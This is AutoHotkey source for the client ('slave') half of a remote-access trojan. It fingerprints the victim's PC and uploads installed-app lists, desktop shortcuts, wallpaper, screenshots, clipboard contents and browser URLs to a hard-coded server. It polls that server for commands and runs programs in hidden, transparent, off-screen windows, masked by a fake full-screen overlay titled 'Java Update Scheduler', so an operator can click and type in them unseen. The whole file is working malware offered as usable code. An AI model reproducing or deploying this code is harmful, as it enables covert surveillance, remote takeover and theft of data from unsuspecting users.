;======= Slave executable of the program =======

#NoEnv
#SingleInstance ignore
;#NoTrayIcon
SetBatchLines, -1
SetControlDelay -1
DetectHiddenWindows, On
CoordMode, Mouse, Screen
SetTitleMatchMode, 2
FileCreateDir, %A_AppData%\Temporary\
SetWorkingDir, %A_AppData%\Temporary\
ServerLink = http://otsoserver.otso.space:447/ ; =======SERVER INFORMATION=======

#Include winapi.ini
#Include wininet.ini





;launch on second run only:
; If !FileExist( A_AppData "\Temporary\zhopa.txt")
; {
	; sleep 333
	; fileappend, makecert, %A_AppData%\Temporary\zhopa.txt
	; sleep 785
	; exitapp
; }






;get server status (check is server available):
checkserverstatus:
sleep 7777
responsik := GetServer("/", ServerLink)
if (responsik == "terror")
	goto, checkserverstatus

;getting hwid
EnvGet, SysDrive, SystemDrive
DriveGet, serial, Serial, %SysDrive%
pleasetry:
try
{
For obj in ComObjGet("winmgmts:{impersonationLevel=impersonate}!\\" . A_ComputerName . "\root\cimv2").ExecQuery("Select * From Win32_ComputerSystemProduct")
pizda := obj.UUID
}
catch
{
sleep 3000
goto, pleasetry
}

Loop, Parse, A_UserName ;if username is in english, use it as part of HWID
{
FoundPos := RegExMatch(A_LoopField, "[a-zA-Z0-9,.!?&() _-]")
If !FoundPos
{
HWIDAKA := "PC-" serial "-" pizda
Break
}
HWIDAKA := "PC-" StrReplace(A_UserName, " ", "") "-" serial "-" pizda
}

;get installed apps list:
headers := [ "DISPLAYNAME", "VERSION", "PUBLISHER", "PRODUCTID", "REGISTEREDOWNER", "REGISTEREDCOMPANY", "LANGUAGE", "SUPPORTURL", "SUPPORTTELEPHONE", "HELPLINK", "INSTALLLOCATION", "INSTALLSOURCE", "INSTALLDATE", "CONTACT", "COMMENTS", "IMAGE", "UPDATEINFOURL" ]
data := []           
for k, v in headers
   data.Push( GetAppsInfo({ mask: v, offset: A_PtrSize*(k - 1) }) )

arr := []
for k, v in data
   for i, j in v
      arr[i, k] := j
   
for k, v in arr  {
   appisdata .= (k = 1 ? "" : "`r`n")
   for i, j in v
      appisdata .= (i = 1 ? "" : ", ") . j
}

;get lists of shortcuts both on user's own desktop and on public desktop
yarliksdata = SHORTCUTS:
Loop, Files, %A_Desktop%\*.lnk
{
	try
	{
	Ebalo := ComObjGet("winmgmts:").ExecQuery("Select * from Win32_ShortcutFile where Name='" . StrReplace(A_LoopFileLongPath, "\", "\\") . "'").ItemIndex(0).Target
	yarliksdata = %yarliksdata%`n%Ebalo%
	}
	catch
	{
	}
}
Loop, Files, %A_DesktopCommon%\*.lnk
{
	try
	{
	Ebalo := ComObjGet("winmgmts:").ExecQuery("Select * from Win32_ShortcutFile where Name='" . StrReplace(A_LoopFileLongPath, "\", "\\") . "'").ItemIndex(0).Target
	yarliksdata = %yarliksdata%`n%Ebalo%
	}
	catch
	{
	}
}

;get wallpaper
Loop Files, %A_AppData%\Microsoft\Windows\Themes\CachedFiles\*.jpg
	wallpaperfile := A_LoopFileFullPath

;registering computer on server and putting info about it
FileAppend, %appisdata%, %A_AppData%\Temporary\appsdata.log, UTF-8
PutServer(A_AppData "\Temporary\appsdata.log", HWIDAKA "/appsdata.txt", ServerLink) ;tell server about installed apps
FileDelete, %A_AppData%\Temporary\appsdata.log

FileAppend, %yarliksdata%, %A_AppData%\Temporary\yarliksdata.log, UTF-8
PutServer(A_AppData "\Temporary\yarliksdata.log", HWIDAKA "/yarliksdata.txt", ServerLink) ;tell server about shortcuts on desktop
FileDelete, %A_AppData%\Temporary\yarliksdata.log

PutServer(wallpaperfile, HWIDAKA "/wallpaper.jpg", ServerLink) ;send server current wallpaper

;checking for commands and sending alive status
Zaloop:
Loop
{
	;sending "alive" status to server:
	FileAppend, %A_Now%, %A_AppData%\Temporary\last_active.log, UTF-8
	DelServer(HWIDAKA "/last_active.log", ServerLink)
	PutServer(A_AppData "\Temporary\last_active.log", HWIDAKA "/last_active.log", ServerLink)
	FileDelete, %A_AppData%\Temporary\last_active.log
	
	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting current command
	
	if InStr(currentcommand,"allwinshot") ;if command to make screenshot of all screen
	{
	DelServer(HWIDAKA "/current.command", ServerLink)
	FileDelete, %A_AppData%\Temporary\screen.jpg
	DelServer(HWIDAKA "/screen.jpg", ServerLink)
	CaptureScreen(0, 1, A_AppData "\Temporary\screen.jpg", 40)
	PutServer(A_AppData "\Temporary\screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
	FileDelete, %A_AppData%\Temporary\screen.jpg
	goto, Zaloop
	}
	
	If InStr(currentcommand,"execute,")
		goto, executing
	Else
		sleep 10000

}


executing: ;finally executing opening a hidden window
StringSplit, command_array, currentcommand, `,
windowweneed = %command_array7% ; win title we are waiting for
offset := 120
smallerW := A_ScreenWidth - offset
smallerH := A_ScreenHeight - offset

;move mouse away from taskbar:
MouseGetPos, xxx, yyy,,,3 
if ((xxx > smallerW) || (yyy > smallerH))
	MouseMove, -%offset%, -%offset%, 0, R
if ((xxx < offset) || (yyy < offset))
	MouseMove, %offset%, %offset%, 0, R
	
;------ fake screenshot:
;Blockinput, On ;do we need this? who knows...
CaptureScreen(0, 0, A_AppData "\Temporary\XWD.PNG")
SplashImage, %A_AppData%\Temporary\XWD.PNG, w%A_ScreenWidth% h%A_ScreenHeight% x0 y0 B,,, Java Update Scheduler
WinMove, Java Update Scheduler,, X0, Y0, %A_ScreenWidth%, %A_ScreenHeight%
WinSet, AlwaysOnTop, On, Java Update Scheduler,

Run, %command_array2%%A_Space%%command_array3%

sleep 100
waitingforworms: ;waiting for the window to be open
sleep 100
if !WinExist(windowweneed)
	goto, waitingforworms

WinGet, hwnd,ID,%windowweneed% ;getting hwnd of window and START HWND LIFE!!!!

;hide the launched window:
WinRestore, ahk_id %hwnd%
WinMove, ahk_id %hwnd%,, %smallerW%, %smallerH%, %command_array5%, %command_array6% ;move window almost out of screen and set size we need
WinSet, Transparent, 1, ahk_id %hwnd% ;make window transparent
WinSet, ExStyle, +0x80, ahk_id %hwnd% ;remove window icon in taskbar by setting its style
WinSet, AlwaysOnTop, On, ahk_id %hwnd%

Blockinput, Off
sleep 199
WinSet, Top,, ahk_class Shell_TrayWnd ;make taskbar appear in front of our window again
SplashImage, Off
FileDelete, %A_AppData%\Temporary\XWD.PNG

Loop ;checking server for active commands and executing them
{
	Loop 6 ; check mouse legality
	{
		sleep 70
		;WinClose, ahk_class Chrome_WidgetWin_1, , , Google Chrome ;close "odd" "window"
		MouseGetPos, xx, yy,,,3
		if ((xx >= smallerW) && (yy >= smallerH))
			winhide, ahk_id %hwnd%
		else
			winshow, ahk_id %hwnd%
	}
FileAppend, `n%A_Sec% i finished mouse legality, log.txt ;----------------------------------------------
	
	;taking and sending the window screenshot to the server
	WinGetPos,,, OutWidth, OutHeight, ahk_id %hwnd%
	pToken:=Gdip_Startup()
	pBitmap:=Gdip_BitmapFromHWND(hwnd)
	pBitmap_part:=Gdip_CloneBitmapArea(pBitmap, 0, 0, OutWidth, OutHeight)
	Gdip_SaveBitmapToFile(pBitmap_part, A_AppData "\Temporary\shota.jpg")
	Gdip_DisposeImage(pBitmap)
	Gdip_DisposeImage(pBitmap_part)
	Gdip_Shutdown(pToken)
FileAppend, `n%A_Sec% i just shotted window!, log.txt ;----------------------------------------------
	sleep 9
	PutServer(A_AppData "\Temporary\shota.jpg", HWIDAKA "/shota.jpg", ServerLink)
	FileDelete, %A_AppData%\Temporary\shota.jpg
FileAppend, `n%A_Sec% i finished regular screenshot, log.txt ;----------------------------------------------

	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting command from server
FileAppend, `n%A_Sec% i received a command %currentcommand% from server, log.txt ;----------------------------------------------
	
	;checking for commands and acting accordingly:
	if InStr(currentcommand, "nothing") ;if commanded to exit, close window and go back to monitoring
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		WinMove, ahk_id %hwnd%,, 100, 100
		WinRestore, ahk_id %hwnd%
		WinClose, ahk_id %hwnd%
		sleep 1700
FileAppend, `n%A_Sec% i finished and went 2 zaloop, log.txt ;----------------------------------------------
		goto, Zaloop
	}
	if InStr(currentcommand,"allwinshot") ;command to make screenshot of all screen
	{
	DelServer(HWIDAKA "/current.command", ServerLink)
	FileDelete, %A_AppData%\Temporary\screen.jpg
	DelServer(HWIDAKA "/screen.jpg", ServerLink)
	CaptureScreen(0, 1, A_AppData "\Temporary\screen.jpg", 40)
	PutServer(A_AppData "\Temporary\screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
	FileDelete, %A_AppData%\Temporary\screen.jpg
FileAppend, `n%A_Sec% i finished allwinshot, log.txt ;----------------------------------------------
	}
	if InStr(currentcommand, "clickandtext") ;clickandtext,X88 Y88,helloworld
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		StringSplit, splitted, currentcommand, `,
		ControlClick, %splitted2%, ahk_id %hwnd%,, LEFT,,
		sleep 95
		ControlSend,, %splitted3%, ahk_id %hwnd%
FileAppend, `n%A_Sec% i finished clicking, log.txt ;----------------------------------------------
		
	}
	if InStr(currentcommand, "copylink") ;copylink,please
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		anus := Clipboard
		ControlSend,, ^{l}, ahk_id %hwnd%
		ControlSend,, ^{c}, ahk_id %hwnd%
		ControlSend,, ^{Esc}, ahk_id %hwnd%
		FileAppend, Url: %Clipboard%`nCurrent clipboard: %anus%, %A_AppData%\Temporary\clip.txt, UTF-8
		PutServer(A_AppData "\Temporary\clip.txt", HWIDAKA "/clip.txt", ServerLink)
		FileDelete, %A_AppData%\Temporary\clip.txt
		Clipboard := anus
	}
}




